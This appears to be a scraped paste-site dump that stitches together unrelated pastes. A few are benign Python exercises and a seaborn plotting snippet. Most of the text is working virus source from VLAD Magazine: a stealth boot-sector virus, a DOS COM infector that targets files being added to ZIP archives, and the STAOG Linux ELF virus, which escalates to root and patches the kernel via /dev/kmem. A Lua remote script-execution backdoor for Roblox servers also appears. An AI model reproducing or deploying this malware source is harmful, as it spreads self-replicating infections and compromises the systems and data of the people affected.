for _ in range(n):
    string = input()

    if ',' in string or '.' in string or '_' in string:
        print(f""{string} is not pure!"")
    else:
        print(f""{string} is pure."")
"
Ac4cWDug,Orders,DiYane,Python,Sunday 2nd of July 2023 10:01:00 AM CDT,"n = int(input())
total_price = 0

for _ in range(n):
    price_per_capsule = float(input())
    days = int(input())
    capsules_per_day = int(input())

    if 0.01 <= price_per_capsule <= 100.00 and 1 <= days <= 31 and 1 <= capsules_per_day <= 2000:
        order_price = price_per_capsule * days * capsules_per_day
        total_price += order_price
        print(f""The price for the coffee is: ${order_price:.2f}"")

print(f""Total: ${total_price:.2f}"")"
QQCEdUXv,Kaggle - Exercise 6 - Set style to lineplot,makispaiktis,Python,Sunday 2nd of July 2023 10:00:35 AM CDT,"import pandas as pd
pd.plotting.register_matplotlib_converters()
import matplotlib.pyplot as plt
# %matplotlib inline
import seaborn as sns


# 1. Read the dataset
spotify_filepath = ""../input/spotify.csv""
spotify_data = pd.read_csv(spotify_filepath, index_col=""Date"", parse_dates=True)

# 2. Set the desired style. Choices are: ""white"", ""whitegrid"", ""dark"", ""darkgrid"", ""ticks""
sns.set_style(""darkgrid"")
plt.figure(figsize=(12,6))
sns.lineplot(data=spotify_data)"
EUxxnd9X,VLAD Magazine - Issue #7 - ARTICLE.2_5 - Dr.Pow's Boot Virus,FlyFar,ASM (NASM),Sunday 2nd of July 2023 09:58:19 AM CDT,";       �� ������ �� ��� �������� ���� �����  ������������-� �������� �Ŀ
;       �                      �B�O�O�T� �V�I�R�U�S�                    �
;       �         Author:     Dr. Pow                                   �
;       .         Version:    4.0                                       �
;       |         Infection:  i13/ah=2,3/cx=0001/dh=00
;                 Stealth:    i13/ah=2/cx=0001/dh=00                    �
;                 Size:       242 bytes                                 �
;       �         Assembler:  A86v4.02                                  �
;       ��-������ �� ��������� ���� �����  ������������ �  �������� ���ľ

		org     0

;�����������������������������������������������;

		dw      3CEBh                   ; JMP  SHORT  003F
		db      3Ch dup(0)

		cli
		xor     di, di
		mov     ds, di
		mov     ss, di
		mov     sp, 7C00h

		mov     si, 412h                ; ""Fool the scanner"" trick..
		inc     si
		dec     W [si]                  ; Allocate 1Kb memory
		lodsw                           ; Get the top of memory
		mov     cl, 6
		shl     ax, cl                  ; Convert to para
		mov     es, ax

		cld
		mov     si, sp                  ; SP=7C00
		mov     cx, 0FEh
		repz    movsw                   ; Move virus to TOM

		mov     si, 13h*4
		movsw                           ; Get i13 entry..
		movsw
		mov     W [si-4], offset Hand_13
		mov     W [si-2], es

		sti
		int     19h                     ; Reload boot
MyID            db      ""-Pow-""

;�����������������������������������������������;

ReadDisk:       mov     ax, 0201h
		jmp     short  Do_13
WriteDisk:      mov     ax, 0301h
Do_13:          pushf
		call    D cs:[1FCh]             ; Call i13
		ret


Hand_13:        mov     B cs:[Function+1], ah   ; Save function number
		call    Do_13                   ; Do their INT
		push    ax, cx, dx, si, di, es, bx
		pushf

Function:       mov     al, 00
		dec     ax
		dec     ax                      ; al=0(read), =1(write)
		cmp     al, 1                   ; Write ?
		ja      PopAllExit
		cmp     cx, 1                   ; Cylinder 0, sector 1?
		jnz     PopAllExit
		or      dh, dh                  ; Head 0?
		jnz     PopAllExit

		push    ax, cs
		pop     es
		mov     bx, 200h
		call    ReadDisk                ; Read boot to CS:0200
		pop     ax
		jb      PopAllExit              ; Error? Lets abort

		inc     cx                      ; Hard disk MBR at 0/0/2
		or      dl, dl
		js      PosOK
		mov     cl, 14                  ; Floppy boot at 0/1/14
		mov     dh, 1

PosOK:          cmp     W es:[bx+MyID], 'P-'    ; Am I home?
		jnz     Infect                  ; No? I'm coming!
		or      al, al                  ; Read function?
		jnz     PopAllExit
		popf
		pop     bx, es
		call    ReadDisk                ; Read orig boot in their buffer
		jmp     short  PopDiExit

Infect:         call    WriteDisk               ; Write orig boot
		jb      PopAllExit              ; Error? Lets abort
		mov     si, 3Eh
		mov     di, 23Eh
		mov     cl, 0DFh                ; Words to move
		cld
		rep     movsw  cs:              ; Move virus to our buffer
		mov     W es:[bx], 3CEBh        ; Move JMP SHORT opcode
		inc     cx                      ; CX=0001
		mov     dh, 0
		call    WriteDisk               ; Write back infected boot

PopAllExit:     popf
		pop     bx, es
PopDiExit:      pop     di, si, dx, cx, ax
		retf    0002o


"
gVaMinJq,Rose Hub Serverside,Humanoid,Lua,Sunday 2nd of July 2023 09:58:02 AM CDT,"--[[
Rose Hub Serverside 1.0.0
--]]

local Keys = {
	[""SETKEYHERE""] = true,
}

local SessionBlacklist = {}
local DefEnv = getfenv()

local loadstring = require(3356620558)
local ExecLocal = require(3388222699)
local WRONG_KEY_COOLDOWN = 30

local function IsInstance(o)
	return typeof(o) == ""Instance""
end

local SandBox = {}

local InstanceBlacklist = {
	[""Player""] = true,
}

SandBox.Cache = setmetatable({}, {__mode = 'k'})
SandBox.Metatable = {}

local function SafeDestroy(obj)
	for i,v in next, InstanceBlacklist do
		if obj:IsA(i) and v then
			return error(""You cannot destroy a ""..i)
		end
	end

	return obj:Destroy()
end -- i dont know

local Wrap = nil
local Unwrap = nil

local function WrapUserdata(real)
	local fake = newproxy(true)
	--setmetatable(fake, SandBox.Metatable)
	local mt = getmetatable(fake)
	for i,v in next, SandBox.Metatable do
		mt[i] = v
	end
	SandBox.Cache[fake] = real

	return fake
end

local function WrapFunction(real)
	local function fake(...) -- Function Wrapper
		local args = Unwrap{...}
		local results = Wrap{real(unpack(args))}
		return unpack(results)
	end

	SandBox.Cache[fake] = real
	return fake
end

local function WrapTable(real)
	local fake = {}

	for k,v in next, real do
		fake[k] = Wrap(v)
	end

	return fake
end

local function Wrap(real)
	for wrapped, r in next, SandBox.Cache do
		if r == real then
			return wrapped
		end
	end

	local t = type(real)

	if t == ""userdata"" then
		return WrapUserdata(real)
	end

	if t == ""function"" then
		return WrapFunction(real)
	end

	if t == ""table"" then
		return WrapTable(real)
	end
end

local function Unwrap(wrapped)
	if type(wrapped) == ""table"" then
		local real = {}

		for k,v in next, wrapped do
			real[k] = Unwrap(v)
		end

		return real
	else
		local real = SandBox.Cache[wrapped]

		if not real then
			return wrapped
		end

		return real
	end
end

function SandBox.Metatable.__index(self, k)
	local real = SandBox.Cache[self] -- Get the real object by indexing the cache by the wrapped object

	if k:lower() == ""destroy"" or ""remove"" then
		return SafeDestroy
	end

	if k:lower() == ""ClearAllChildren"" then
		return SafeDestroy
	end

	return Wrap(real[k])
end

function SandBox.Metatable.__newindex(self, k)
	local real = SandBox.Cache[self]
	real[k] = v
end

function SandBox.Metatable.__tostring(s)
	local real = SandBox.Cache[self]
	return tostring(real)
end

local function Pack(...)
	return {...}
end

local Scripts = {

}

local Gateway = Instance.new(""RemoteFunction"", game.JointsService) --lol

local function Request(client, exec, ...)
	if SessionBlacklist[client] then
		return 0;
	end

	local Data = {...}
	local ScriptReq = {
		Key = Data[1],
		Script = Data[2],
		Arguments = Data[3]
	}

	if not Keys[ScriptReq.Key] then
		SessionBlacklist[client] = true
		spawn(function()
			wait(WRONG_KEY_COOLDOWN)
			SessionBlacklist[client] = false
		end)

		return 0;
	end

	if exec and ScriptReq.Script then
		local env = DefEnv -- get our env :sunglasses:
		-- lets edit it a bit

		for i,v in next, env do
			env[i] = Wrap(v) -- Wrap everything in the env
		end

		env.owner = client -- Maybe in the future we could add more void sb support?

		local sc = Instance.new(""Script"")
		env.script = sc

		function env.NLS(src, par)
			return ExecLocal(client, src, par)
		end

		local func = loadstring(ScriptReq.Script, env) -- since this is a rerubi wrapped function, we have to pass the env


		return Pack(func(unpack(ScriptReq.Arguments or {})))
	end

	local Script = Scripts[ScriptReq.Script]

	if not Script then
		return 0;
	else
		return Pack(loadstring(Script)(unpack(ScriptReq.Arguments or {})))
	end
end

Gateway.OnServerInvoke = Request
"
iwiPn9S2,VLAD Magazine - Issue #7 - ARTICLE.4_1 - Zip Virus,FlyFar,ASM (NASM),Sunday 2nd of July 2023 09:55:59 AM CDT,";Lately I've seen some viruses boasting they could infect archivers.
;(Hi Sepultura, didnt you test chaos-ad ???)
;This is quite simple for ARJ etc. But with PKZIP this is quite different,
;due to the way PKZIP gets the size of the files to be compressed.
;Most archivers look for files via INT 21h/ah=4Eh/4Fh.
;Then the file is opened and compressed, no matter whats in the DTA.
;PKZIP looks up filesizes before opening files and stores them somehow.
;Only the filesize in the DTA will be compressed. That means, if a FastInfector
;, infecting on OpenFile, is active, it will NOT be in the compressed file !
;(Well, yes, the header changes are compressed, but the main portion appended
;to the host will be lost).
;
;So the Idea is the following :
;-look for files with extension .ZIP being opened for Read/Write access
; (PKUNZIP opens for readonly)
;-if a ZIP-file is opened, set a flag for enabling infect on OpenFile
;-if a ZIP-File is closed, it is assumed compression is over -> clear flag
;-whenever FindFirst/FindNext occurs and flag is set,
; check if file is infectable; if so,
; increase FileSize in DTA (may do some DirStealth if not)
;-whenever a file is opened, check flag
;-if flag is set, infect file the usual way
;-disinfect when its closed (oly the archived files shall be infected)
;
;Care should be taken not to infect files whose size wasnt increased
;(CRC-Errors, corruption of program), or to increase Filesizes of files
;one will not infect later
;(resulting in CRC-Errors)
;
;
;The following code does it, but it is in NO way optimized.
;Some parts are plain bogus, as the whole stuff is experimental.
;It will infect suitable COMs that are compressed with PKZIP to an
;archive with the extension .ZIP, nothing else.
;
;Routines commented in Italian are with friendly permission of Tankard.
;
;And, ehhmmm, there is a problem with INT 21h/ah=4Eh. Some programs hang
;with this routine active, so i commented it out. (Solutions?)
;
;
;------------------Cut here--------------------------------------------
.model tiny
.radix 16
.286
.code
	org     100h
jumps
len             EQU  vir_end-start
MCB_Flag        EQU  00h                        ;
MCB_Owner       EQU  01h                        ;
MCB_Size        EQU  03h                        ;
MCB_Name        EQU  08h                        ;
MCB_Junk        EQU  05h                        ;
COMMAND_LENGTH  EQU  11                         ;
EnvPtr          EQU  002ch                      ;

start:
		  call    Get_Offset
Get_Offset:
		  pop     si

		  mov cx,0FCFCh
		  mov ah,30h            ;get DOS-Version  ;-))
		  int 21h
		  cmp ax,0FADEh
		  je no_install

push si
add si,offset flag
sub si,offset get_offset
mov byte ptr cs:[si],'X'        ;set flag off
pop si

;                  mov sp,si            ;you want a stack ?
;                  add sp,offset vir_end
;                  add sp,200h

		  push  cs             ;
		  pop   ds                                ;

		  MOV   BP,SI          ;
		  push  si
		  SUB   BP,Offset Get_Offset;
		  MOV   Cx,00ffh       ; Lunghezza del virus in memoria
		  CALL  Alloca_Memory  ;
		  JC    qui1           ; se non c'era spazio a disposizione

		  MOV   Di,0100h       ; Copia addesso il virus in memoria alta
		  MOV   Si,BP          ;
		  ADD   Si,0100h       ;
		  MOV   Cx,len         ;
		  REP   MOVSB          ; Fine Copia

		  push    es
		  mov     ax,3521h
		  int     21h                      ;Get Int 21 Address
		  pop     ds
		  mov     word ptr ds:[offset Int_21],bx      ;Save old Int 21
		  mov     word ptr ds:[offset Int_21+02h],es
		  mov     dx,Offset Int_21_Handler
		  mov     ah,25h
		  int     21h            ;Set Int 21

qui1:             pop     si
no_install:
;restore to host
;rewrite header
	mov cx,05h
	push cs
	pop es
	add si,offset header1
	sub si,offset get_offset
	mov di,0100h
	rep movsb                        ;copy header ds:si->es:di
	mov di,0100h
	jmp di

		  mov ax,4C00h
		  int 21h

COMMAND_STR DB 'TANxxxxxxx',0
;
;----------------------------------------------------------------------------

Int_21_Handler:
	cmp ah,3Dh          ;Is open via Handle?
	je open_handle
	cmp ah,3Eh
	je close_handle

	cmp ah,4Fh          ;size is checked beforehand !
	je find_file
;        cmp ah,4Eh          ;findfirst
;        je find_file

	cmp ah,12h
	je find_file_fcb
	cmp ah,11h
	je find_file_fcb

	cmp ah,30h          ;residency check, was DOS-Version
	je im_here

	jmp     Go_Int_21          ;No, Restore control to Int 21

;------------------------------------------------------------------------
im_here:
	cmp cx,0FCFCh
	jne go_int_21
	mov ax,0FADEh
	iret
;------------------------------------------------------------------------
find_file_fcb:
	pushf
	call cs:[int_21]
	jc fff_error

	push ax bx cx dx ds es di si bp
	pushf

	cmp byte ptr cs:[offset flag],'#'
	je no_need



	mov ah,51h
	int 21h                 ;get DTA
	mov es,bx
	cmp bx,es:[16h]
	jnz no_need
	mov bx,dx
	mov al,[bx]

	push ax
	mov ah,2Fh
	int 21h
	pop ax

	inc al
	jnz standard_fcb
extended_fcb:
	add bx,07h                      ;extended FCB
standard_fcb:
	mov ax,es:[bx+17h]              ;get time
	and ax,0000000000011111b        ;unmask seconds
	xor ax,0000000000010101b        ;is 42 s ?
	jnz no_need
	sub es:[bx+1Dh],len
;        sbb es:[bx+1Fh],00h

no_need:

	popf
	pop bp si di es ds dx cx bx ax

fff_error:
	retf 2
;-------------------------------------------------------------------------
find_file:
	pushf
	call cs:[int_21]
	jc find_error

	push ax bx cx dx ds es di si bp
	pushf

	mov ah,2Fh                  ;get DTA
	int 21h                 ;es:bx->dta

	cmp byte ptr cs:[offset flag],'#'
	jne dir_stealth                    ;

	mov cx,word ptr es:[bx+16h]        ;get filetime
	and cx,0000000000010101b
	cmp cx,0000000000010101b           ;is 42s ?
	je is_infected

	cmp word ptr es:[bx+1Ah],0EFFFh    ;size, shouldnt be too big
	ja is_infected

	push bx
	pop di
	add di,1Eh
	cld
	mov cx,0Ah
	mov ax,'C.'                   ;search filename for extension .COM
find_com_loop:
;dec di
	scasw                   ;es:di=ax ?
	je loc_01
	dec di
	dec cx
	jnz find_com_loop
	jmp is_infected
loc_01:
	mov ax,'MO'
	scasw
	jne is_infected

; is *.COM of right size and time other than 42 sec, prepare for infection !
	mov cx,word ptr es:[bx+16h]
	and cx,1111111111100000b            ;clear seconds
	xor cx,0000000000010101b            ;set 42 seconds (my marker)
	mov word ptr es:[bx+16h],cx         ;set time
	add es:[bx+1Ah],len                 ;now add virus_size
	jmp is_infected

dir_stealth:
	mov ax,word ptr es:[bx+16h]
	and ax,0000000000010101b
	cmp ax,0000000000010101b
	jne is_infected
	sub es:[bx+1Ah],len
;        sbb es:[bx+1Ah],00h


is_infected:
no_com:
	popf
	pop bp si di es ds dx cx bx ax
find_error:

	 retf 2


;------------------------------------------------------------------------
open_handle:
	cmp byte ptr cs:[offset flag],'#'   ;is a file .ZIP open ?
	je infect

	push ax bx cx dx ds es di bp si
	push ax
	push ds
	pop es
	push dx
	pop di
	mov al,'.'
	cld
	repne scasb             ;al=es:di?

	push es
	pop ds
	push di
	pop si

	lodsw                   ;ds:si->al
	cmp ax,'IZ'
	jne no_zip

	lodsb                   ;ds:si->al
	cmp al,'P'
	jne no_zip

	jmp set_flag            ;if file of extension .ZIP is opened, set flag
no_zip:
	pop ax
	pop si bp di es ds dx cx bx ax
	jmp go_int_21

infect:                         ;flag is set
	pushf
	call cs:[int_21]        ;open requested file
	jc quit

	push ax bx cx dx ds es di bp si
	xor bx,bx
	mov bx,ax                  ;handle in bx
	push bx
	mov ax,1220h
	int 2Fh
	jc quit_sft
	mov ax,1216h
	mov bl,es:[di]
	int 2Fh                     ;get es:di -> sft
	jc quit_sft
	mov word ptr cs:[offset sft_off],di
	mov word ptr cs:[offset sft_seg],es
	pop bx

	mov es:[di+02h],byte ptr 02h         ;set open_mode r/w
	cmp word ptr es:[di+28h],'OC'        ;is *.COM ?
	jne quit
	cmp byte ptr es:[di+2Ah],'M'         ;is really *.COM ?
	jne quit

	mov cx,word ptr es:[di+0D]           ;get time
	and cx,0000000000010101b
	cmp cx,0000000000010101b             ;check if infected
	je quit

	mov ax,4200h
	cwd
	xor cx,cx
	int 21h                          ;go start of file
	jc quit

	mov ah,3Fh
	mov cx,05h
	mov dx,offset header1
	push cs
	pop ds
	int 21h                          ;read header to buffer
	jc quit

	mov cx,05h
	push cs
	pop es
	mov si,offset header1
	mov di,offset header2
	rep movsb                        ;copy header

	cmp word ptr cs:[offset header1+03h],'##' ; yet  another infection
marker ;-))
	je quit                          ;already infected

	mov ax,4202h
	cwd
	xor cx,cx
	int 21h                          ;go eof
	jc quit
	mov f_seg,dx
	mov f_off,ax                     ;save eof for JMP

	cmp ax,0EFFFh                    ;if file is too big
	ja quit

	mov ah,40h
	mov cx,len
	mov dx,0100h
	int 21h                          ;append to host
	jc quit
	mov ax,4200h
	cwd
	xor cx,cx
	int 21h                          ;go sof
	jc quit

	mov byte ptr cs:[header2],0E9h         ;form jmp
	sub f_off,03h
	mov ax,f_off
	mov word ptr cs:[header2+01h],ax
	mov word ptr cs:[header2+03h],'##'        ;infectmarker

	mov ah,40h
	mov cx,05h
	mov dx,offset header2
	int 21h                          ;write header to sof from ds:dx
	jc quit

	mov ax,4200h
	cwd
	xor cx,cx
	int 21h                          ;go sof
	jc quit


	mov ax,5700h                        ;get date&time
	int 21h                             ;dont want to change it
	mov word ptr cs:[offset f_time],cx  ;save time
	mov word ptr cs:[offset f_date],dx  ;save date

	mov byte ptr cs:[offset marker],'I'
quit:
	pop si bp di es ds dx cx bx ax

exit_infect:
	iret

;---------------------------------------------------------------
disinfect:                      ;is not zip and no flag
	pushf
	call cs:[int_21]        ;perform original open
	retf 2                  ;one could provide stealth capabilities here
;------------------------------------------------------------------------

set_flag:
	 pop ax

	 cmp al,00100010b               ;is read/write access ?
	 je zip_rw
	 cmp al,00100000b               ;is read/only acces ?
	 je zip_ro
	 jne no_flag
zip_rw:
	 mov byte ptr cs:[offset flag],'#'
	 jmp short no_flag
zip_ro:
	 mov byte ptr cs:[offset flag],'@'
	 jmp short no_flag

no_flag:
	 pop si bp di es ds dx cx bx ax
	 jmp go_int_21
;------------------------------------------------------------------------
close_handle:
;is *.zip closed ? if yes clear flag
;is no zip and flag is on -> disinfect
	push ax bx cx dx ds es di bp si
	mov ax,1220h
	push bx
	int 2Fh
	jc quit_sft
	mov ax,1216h
	mov bl,es:[di]
	int 2Fh          ;get sft -> es:di
	jc quit_sft

	cmp byte ptr es:[di+28h],'Z'
	jne not_zip
	cmp word ptr es:[di+29h],'PI'
	jne not_zip
clear_flag:
	mov byte ptr cs:[offset flag],'X'

	jmp quit_sft

not_zip:

;is zip-r/w-access (flag='#') -> disinfect
;is zip-r/o-access (flag='@') -> no disinfect
	cmp byte ptr cs:[offset flag],'#'
	jne try_slow_infect

	call disinfect_handle
	jmp quit_sft

try_slow_infect:                ;all this is plain stupid !

	mov al,byte ptr es:[di+02h]
	and al,00000011b             ;last two bits are (w/o or r/w)
	cmp al,00h
	je quit_sft



quit_sft:
	mov byte ptr cs:[offset marker],'N'; .ZIP is closed, so clear flag
	pop bx
	pop si bp di es ds dx cx bx ax
	jmp go_int_21

;------------------------------------------------------------------------
disinfect_handle:
	push ax bx cx dx ds es di bp si
	xchg ax,bx

	cmp byte ptr cs:[offset marker],'I'
	jne quit_d

	push bx
	mov ax,1220h
	int 2Fh
	mov ax,1216h
	mov bl,es:[di]
	int 2Fh                 ;get es:di -> sft
	mov word ptr cs:[offset sft_off],di
	mov word ptr cs:[offset sft_seg],es
	pop bx

	cmp word ptr es:[di+28h],'OC'        ;is *.COM ?
	jne quit_d
	cmp byte ptr es:[di+2Ah],'M'         ;is really *.COM ?
	jne quit_d
	mov es:[di+02h],byte ptr 02h         ;set open_mode r/w

	mov ax,4200h
	xor dx,dx
	xor cx,cx
	int 21h                  ;go sof
	jc quit_d

	mov ah,3Fh
	mov cx,05h
	mov dx,offset header2
	push cs
	pop ds
	int 21h                  ;read header
	jc quit_d

	cmp word ptr cs:[header2+03h],'##'     ;check infectmarker
	jne quit_d

	mov dx,word ptr cs:[offset header2+01h]  ;read jmp-adress
	push dx                          ;save
	add dx,offset header1
	sub dx,0FDh                 ; = -0100h +03h
	xor cx,cx
	mov ax,4200h
	int 21h                ;set filepointer to original header
	jc quit_d

	mov ah,3Fh
	mov cx,05h
	mov dx,offset header2
	push cs
	pop ds
	int 21h                  ;read original header from virusbody
	jc quit_d

	mov ax,4200h
	xor cx,cx
	xor dx,dx
	int 21h                 ;filepointer to start

	mov ah,40h
	mov cx,05h
	push cs
	pop ds
	mov dx,offset header2
	int 21h                  ;write header to sof from ds:dx
	jc quit_d

	mov ax,4200h
	pop dx                   ;saved jmp
	add dx,03h
	xor cx,cx
	int 21h                  ;move filepointer there
	mov ah,40h
	xor cx,cx
	int 21h                  ;truncate file at old JMP

	mov ax,4200h
	xor cx,cx
	xor dx,dx
		  int 21h

	mov ax,5701h
	mov cx,word ptr cs:[offset f_time]     ;set date&time
	mov dx,word ptr cs:[offset f_date]
	int 21h



quit_d:
	pop si bp di es ds dx cx bx ax
	ret

;this is with friendly permission of TANKARD (thanx dude)
Alloca_Memory PROC NEAR
		MOV  Ah,4Ah                     ;
		MOV  Bx,0FFFFh                  ; richiedi il numero di blocchi
		INT  21h                        ;  del programma ospite
		SUB  Bx,Cx                      ;
		JB   _lab1                      ;
		MOV  Ah,4Ah                     ; modifica il numero di blocchi
		INT  21h                        ;  attuali per liberare spazio
						;  per allocare il virus
		MOV  Ah,48h                     ;
		DEC  Cx                         ; alloca lo spazio per con-
		MOV  Bx,Cx                      ;  tenere il virus
		INT  21h                        ;
		JC   _lab1                      ;
		DEC  Ax                         ;
		MOV  ES,Ax                      ;
		INC  Ax                         ; fallo stare residente come
		MOV  ES:[MCB_Owner],Ax          ;  un prg TSR
		MOV  Dx,Ax                      ;
		MOV  Ah,26h                     ;
		INT  21h                        ; crea nuovo PSP per il blocco
																;  di memoria
		MOV  Di,MCB_Junk                ;
		LEA  Si,COMMAND_STR             ; - 06h       ;
		ADD  Si,BP                      ; copy nel Memory Control Block
		MOV  Cx,COMMAND_LENGTH          ;  la stringa ""COMMAND""
		PUSH CS                         ;
		POP  DS                         ;
		REP  MOVSB                      ;

		MOV  Ax,ES                      ;
		INC  Ax                         ;
		MOV  ES,Ax                      ;
		CLC                             ;
		RET                             ;
_lab1         : STC                             ;
		RET                             ;
Alloca_Memory ENDP



Go_Int_21:
	db      0EAh            ;Go On With Int 21
Int_21   dd      ?
flag db 00h
header1 db 0CDh, 20h, 00h, 00h, 00h, 00h ;this is just for this very COM-File
header2 db 05h dup (?)                   ; it means INT 20h
f_time dw ?
f_date dw ?
sft_off dw ?
sft_seg dw ?
f_off dw ?
f_seg dw ?
marker db ?
vir_name db '??'        ;Never named one!

vir_end:
end     start"
dagtgBVD,VLAD Magazine - Issue #7 - ARTICLE.2_4 - STAOG Linux Virus,FlyFar,ASM (NASM),Sunday 2nd of July 2023 09:54:03 AM CDT,"#  +-----------------------------------------------------------------+
#  |                            S T A O G                            |
#  |                                                                 |
#  |          yo ho.. welcome to yet another attempt at the          |
#  |        impossible and improbable.  This virus is a fully        |
#  |       resident linux elf infector.  It will infect files        |
#  |           on execute regardless of who executed them.           |
#  |         It achieves this by hacking root via 3 separate         |
#  |     exploits and installing itself in the kernel.  It leaves    |
#  |        no trace of itself in drop files or other noticable      |
#  |          locations but contains no stealth of any type.         |
#  |                                                                 |
#  |       This is not a script virus.  It is written in 100%        |
#  |       at&t style asm.  To compile:                              |
#  |                                                                 |
#  |                   gcc vircode.s -o vircode                      |
#  |                   strip vircode                                 |
#  |                                                                 |
#  |   The filesize should be 4744 bytes.  If not put the filesize   |
#  |        in the .long at 'filesize:' and recompile and strip.     |
#  |          Then execute to install.  After installation the       |
#  |         generated binary will automatically be deleted.         |
#  |                                                                 |
#  |   For some reason this virus will only work on ELF machines     |
#  |       running the 1.2.13 kernel.                                |
#  |                                                                 |
#  |                    Q U A N T U M  /  V L A D                    |
#  +-----------------------------------------------------------------+

.text
.global vircode
vircode:                                  # start of the virus
	pushl $0                          # entry point
	pushl %ebp                        # setup stack frame
	movl %esp,%ebp
	pusha                             # save all regs
	movl $125,%eax                    # make cs writable
	movl $0x8000000,%ebx
	movl $0x4000,%ecx
	movl $7,%edx
	int $0x80
	call recalc                       # dynamic relocation  
recalc:
	pop %edx
	subl $recalc,%edx
	leal vircode(%edx),%eax           # store entrypoint
	movl %eax,4(%ebp)                 

	movl $11,%eax                     # are we already resident ?
	movl $0x666,%ebx
	int $0x80
	cmp $0x667,%ebx
	jnz goresident
	jmp ret2host
goresident:
	movl 12(%ebp),%ebx                # open argv[0]
	xorl %ecx,%ecx
	movl $5,%eax
	int $0x80
	or %eax,%eax
	js ohfuck
	movl %eax,%ebx

	movl $19,%eax                     # seek to vircode
	movl $vircode-main,%ecx           
	subl filesize(%edx),%ecx
	pushl %edx
	movl $2,%edx
	int $0x80
	popl %edx

	subl filesize(%edx),%esp          

	movl $3,%eax                      # read in vircode
	movl %esp,%ecx
	pushl %edx
	movl filesize(%edx),%edx                   
	int $0x80
	popl %edx

	movl $6,%eax                      # close argv
	int $0x80       

	movl $5,%eax                      # open tmp name for virus body
	leal virname(%edx),%ebx
	movl $577,%ecx
	pushl %edx
	movl $448,%edx
	int $0x80
	popl %edx
	movl %eax,%ebx
	
	movl $4,%eax                     # write vircode
	movl %esp,%ecx
	pushl %edx
	movl filesize(%edx),%edx                  
	int $0x80
	popl %edx

	movl $6,%eax                     # close tmp
	int $0x80

	addl filesize(%edx),%esp                  

	movl $2,%eax                         # fork
	int $0x80
	orl %eax,%eax
	jne ret2host

	movl $36,%eax                        # sync
	int $0x80

	leal virname(%edx),%ebx              # exec the virus
	leal virargs(%edx),%ecx
	movl %ebx,(%ecx)
	movl 8(%ebp),%eax
	shll $2,%eax
	leal 16(%ebp),%edx
	addl %eax,%edx
	movl $11,%eax
	int $0x80
	movl $1,%eax
	int $0x80
# return to host
ret2host:
	movl 12(%ebp),%ebx                # open argv[0]
	xorl %ecx,%ecx
	movl $5,%eax
	int $0x80
	or %eax,%eax
	js ohfuck
	movl %eax,%ebx
	movl %esp,%edi                    # allocate space for return frame 
	subl $endstackexecode-stackexecode+50,%edi
	leal stackexecode(%edx),%esi      # copy return frame to stack
	movl $endstackexecode-stackexecode,%ecx
	pushl %edi
	rep
	movsb
	movl $19,%eax                     # move to original bytes in argv[0]
	movl $vircode-main,%ecx
	pushl %edx
	movl $2,%edx
	int $0x80
	popl %edx
	movl $3,%eax                      # ready to read in org bytes 
	leal vircode(%edx),%ecx
	movl $main-vircode,%edx
	ret                               # goto return frame

ohfuck:
	movl $1,%eax
	int $0x80
  
stackexecode:                             # executed on the stack
	int $0x80                         # retreive original bytes
	movl $6,%eax
	int $0x80                         # close file handle
	popa                              # restore all registers
	pop %ebp                          # restore stack
	ret                               # return to host
endstackexecode:

filesize:
.long 4744

st:
.long 0

virname:
.string ""/tmp/hookup""

virargs:
.long 0
.long 0

.string ""Staog by Quantum / VLAD""

.global main
main:
	movl %esp,%ebp
	movl $11,%eax                     # are we already resident ?
	movl $0x666,%ebx
	int $0x80
	cmp $0x667,%ebx
	jnz goresident1
	jmp tmpend
goresident1:
	movl $125,%eax                    # make cs writable
	movl $0x8000000,%ebx
	movl $0x4000,%ecx
	movl $7,%edx
	int $0x80
	movl $130,%eax                    # get num kernel syms
	movl $0,%ebx
	int $0x80
	shll $6,%eax
	subl %eax,%esp
	movl %esp,%esi
	pushl %eax
	movl %esi,%ebx                    # get kernel syms
	movl $130,%eax
	int $0x80
	pushl %esi      
nextsym1:                                  # find symbol
	movl $thissym1,%edi
	push %esi
	addl $4,%esi
	cmpb $95,(%esi)
	jnz notuscore
	incl %esi
notuscore:
	cmpsl
	cmpsl
	pop %esi
	jz foundsym1
	addl $64,%esi
	jmp nextsym1
foundsym1:
	movl (%esi),%esi
	movl %esi,current
	popl %esi

	pushl %esi      
nextsym2:                                  # find symbol
	movl $thissym2,%edi
	push %esi
	addl $4,%esi
	cmpsl
	cmpsl
	pop %esi
	jz foundsym2
	addl $64,%esi
	jmp nextsym2
foundsym2:
	movl (%esi),%esi
	movl %esi,kmalloc
	popl %esi

	xorl %ecx,%ecx
nextsym:                                  # find symbol
	movl $thissym,%edi
	movb $15,%cl
	push %esi
	addl $4,%esi
	rep 
	cmpsb
	pop %esi
	jz foundsym
	addl $64,%esi
	jmp nextsym
foundsym:
	movl (%esi),%esi
	pop %eax
	addl %eax,%esp

	movl %esi,syscalltable
	xorl %edi,%edi
	
opendevkmem:
	movl $devkmem,%ebx           # open /dev/kmem
	movl $2,%ecx
	call openfile
	orl %eax,%eax
	js haxorroot
	movl %eax,%ebx

	leal 44(%esi),%ecx                # lseek to sys_call_table[SYS_execve]
	call seekfilestart
	
	movl $orgexecve,%ecx         # read in execve pointer
	movl $4,%edx
	call readfile

	leal 488(%esi),%ecx               # seek to sys_call_table[SYS_uname]
	call seekfilestart

	movl $taskptr,%ecx           # read in sys_call_table[SYS_uname]
	movl $4,%edx
	call readfile
	
	movl taskptr,%ecx           # seek to uname code
	call seekfilestart

	subl $endhookspace-hookspace,%esp
	
	movl %esp,%ecx                    # read in org uname bytes
	movl $endhookspace-hookspace,%edx
	call readfile
	
	movl taskptr,%ecx           # seek to uname code
	call seekfilestart

	movl filesize,%eax                # amount to alloc
	addl $virend-vircode,%eax
	movl %eax,virendvircodefilesize

	movl $hookspace,%ecx         # write our code
	movl $endhookspace-hookspace,%edx
	call writefile

	movl $122,%eax                    # call uname to alloc some space
	int $0x80
	movl %eax,codeto
	
	movl taskptr,%ecx                 # seek to uname code
	call seekfilestart

	movl %esp,%ecx                    # write org uname bytes
	movl $endhookspace-hookspace,%edx
	call writefile
	
	addl $endhookspace-hookspace,%esp

	subl $aftreturn-vircode,orgexecve       

	movl codeto,%ecx                  # seek to buffer
	subl %ecx,orgexecve
	call seekfilestart

	movl $vircode,%ecx                # write vircode
	movl $virend-vircode,%edx
	call writefile

	subl filesize,%esp                # read in virus      
	pushl %ebx
	movl 8(%ebp),%ebx
	movl (%ebx),%ebx
	xorl %ecx,%ecx
	call openfile
	movl %eax,%ebx
	leal 4(%esp),%ecx
	movl filesize,%edx                      
	call readfile
	call closefile
	popl %ebx

	movl %esp,%ecx                    # write virus to end of alloc space
	movl filesize,%edx                      
	call writefile

